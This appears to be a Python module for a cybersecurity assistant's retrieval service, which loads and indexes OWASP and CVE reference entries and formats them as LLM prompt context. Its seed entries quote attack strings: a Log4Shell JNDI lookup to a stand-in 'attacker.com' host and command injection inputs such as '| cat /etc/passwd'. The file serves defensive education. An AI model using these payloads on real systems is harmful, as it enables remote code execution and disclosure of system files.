"""
RAG Service — Retrieval-Augmented Generation
Loads the cybersecurity knowledge base, indexes it, and retrieves
relevant context for every LLM query.
"""
import json
import logging
from pathlib import Path
from typing import Optional

from app.core.config import get_settings
from app.services.embedding import EmbeddingService, get_embedding_service

logger = logging.getLogger(__name__)
settings = get_settings()


class RAGService:
    def __init__(self, embedding_service: Optional[EmbeddingService] = None):
        self.embedding = embedding_service or get_embedding_service()
        self.top_k = settings.TOP_K_RESULTS
        self.dataset_path = Path(settings.DATASET_PATH)
        self._initialised = False

    # ── bootstrap ────────────────────────────────────────────────────────────

    async def initialise(self) -> None:
        """Load vector store; ingest dataset if index is empty."""
        self.embedding.load_or_create_index()

        if not self.embedding.is_loaded:
            logger.info("Vector store empty — ingesting knowledge base …")
            await self._ingest_dataset()

        self._initialised = True
        logger.info(
            "RAG service ready — %d documents indexed",
            self.embedding.document_count,
        )

    async def _ingest_dataset(self) -> None:
        """Read dataset JSON and add all entries to the vector store."""
        if not self.dataset_path.exists():
            logger.warning(
                "Dataset not found at %s — seeding with built-in examples",
                self.dataset_path,
            )
            documents = _builtin_seed_documents()
        else:
            with open(self.dataset_path, "r") as f:
                raw = json.load(f)
            documents = [
                {
                    "text": entry.get("text", entry.get("description", "")),
                    "title": entry.get("title", ""),
                    "source": entry.get("source", "dataset"),
                    "category": entry.get("category", "general"),
                    "cve": entry.get("cve", ""),
                }
                for entry in raw
                if entry.get("text") or entry.get("description")
            ]

        if documents:
            self.embedding.add_documents(documents)

    # ── retrieval ────────────────────────────────────────────────────────────

    def retrieve(self, query: str) -> list[dict]:
        """Return top-k relevant documents for *query*."""
        if not self._initialised:
            logger.warning("RAG not initialised — calling load_or_create_index directly")
            self.embedding.load_or_create_index()

        return self.embedding.search(query, top_k=self.top_k)

    def build_context_block(self, query: str) -> tuple[str, list[str]]:
        """
        Retrieve relevant docs and format them as a context string.

        Returns:
            context_text  — formatted string to inject into the LLM prompt
            sources       — list of source labels for citation
        """
        docs = self.retrieve(query)
        if not docs:
            return "", []

        lines = ["## Relevant Knowledge Base Entries\n"]
        sources: list[str] = []

        for doc in docs:
            title = doc.get("title", "Entry")
            source = doc.get("source", "KB")
            cve = doc.get("cve", "")
            text = doc.get("text", "")

            header = f"### [{source}] {title}"
            if cve:
                header += f" ({cve})"
            lines.append(header)
            lines.append(text.strip())
            lines.append("")

            label = f"{source}: {title}"
            if label not in sources:
                sources.append(label)

        return "\n".join(lines), sources


# ── built-in seed data ────────────────────────────────────────────────────────

def _builtin_seed_documents() -> list[dict]:
    """Minimal OWASP / CVE seed so the assistant works out-of-the-box."""
    return [
        {
            "title": "SQL Injection (OWASP A03:2021)",
            "text": (
                "SQL Injection occurs when untrusted data is sent to an interpreter as part of a command "
                "or query. Attackers can use SQL injection to bypass authentication, retrieve, modify, or "
                "delete data. Prevention: use parameterised queries / prepared statements, input validation, "
                "and least-privilege DB accounts."
            ),
            "source": "OWASP",
            "category": "injection",
            "cve": "",
        },
        {
            "title": "Cross-Site Scripting XSS (OWASP A03:2021)",
            "text": (
                "XSS flaws occur when an application includes untrusted data in a web page without proper "
                "validation. Attackers can execute scripts in the victim's browser to hijack sessions, "
                "redirect users, or deface websites. Prevention: output encoding, Content Security Policy, "
                "HTTPOnly cookies."
            ),
            "source": "OWASP",
            "category": "xss",
            "cve": "",
        },
        {
            "title": "Log4Shell (CVE-2021-44228)",
            "text": (
                "A critical RCE vulnerability in Apache Log4j 2 via JNDI lookup injection in log messages. "
                "Attackers send a crafted string (e.g. ${jndi:ldap://attacker.com/exploit}) that triggers "
                "remote class loading. CVSS 10.0. Mitigation: upgrade to Log4j 2.17.1+, set "
                "log4j2.formatMsgNoLookups=true, or use a WAF rule."
            ),
            "source": "CVE",
            "category": "rce",
            "cve": "CVE-2021-44228",
        },
        {
            "title": "Broken Access Control (OWASP A01:2021)",
            "text": (
                "Access control enforces policy such that users cannot act outside their intended permissions. "
                "Failures lead to unauthorised information disclosure, modification, or destruction of data. "
                "Prevention: deny by default, enforce on server-side, log access control failures."
            ),
            "source": "OWASP",
            "category": "access_control",
            "cve": "",
        },
        {
            "title": "Command Injection",
            "text": (
                "Command injection attacks are possible when an application passes unsafe user data to a "
                "system shell. Attackers can run arbitrary OS commands. Exploit examples: ; id, && whoami, "
                "| cat /etc/passwd. Prevention: avoid shell calls, use allow-lists, parameterise all "
                "OS-level calls."
            ),
            "source": "OWASP",
            "category": "injection",
            "cve": "",
        },
        {
            "title": "Insecure Deserialization (OWASP A08:2021)",
            "text": (
                "Deserialization of untrusted data can lead to RCE, replay attacks, injection attacks, "
                "and privilege escalation. Java, Python pickle, PHP object injection are common vectors. "
                "Prevention: never deserialise untrusted data, use integrity checks, monitor for anomalous "
                "deserialisation activity."
            ),
            "source": "OWASP",
            "category": "deserialization",
            "cve": "",
        },
        {
            "title": "EternalBlue (CVE-2017-0144)",
            "text": (
                "A critical vulnerability in Windows SMBv1 exploited by WannaCry and NotPetya ransomware. "
                "Buffer overflow in the SMB server allows unauthenticated remote code execution. CVSS 8.1. "
                "Mitigation: apply MS17-010 patch, disable SMBv1, block port 445 at network boundary."
            ),
            "source": "CVE",
            "category": "rce",
            "cve": "CVE-2017-0144",
        },
        {
            "title": "SSRF — Server-Side Request Forgery (OWASP A10:2021)",
            "text": (
                "SSRF flaws occur when an application fetches a remote resource without validating the "
                "user-supplied URL, allowing attackers to make requests to internal services. "
                "Prevention: validate and sanitise all user-supplied URLs, use allow-lists, disable "
                "HTTP redirections, and segment network access."
            ),
            "source": "OWASP",
            "category": "ssrf",
            "cve": "",
        },
    ]


# ── singleton ─────────────────────────────────────────────────────────────────

_rag_service: RAGService | None = None


def get_rag_service() -> RAGService:
    global _rag_service
    if _rag_service is None:
        _rag_service = RAGService()
    return _rag_service
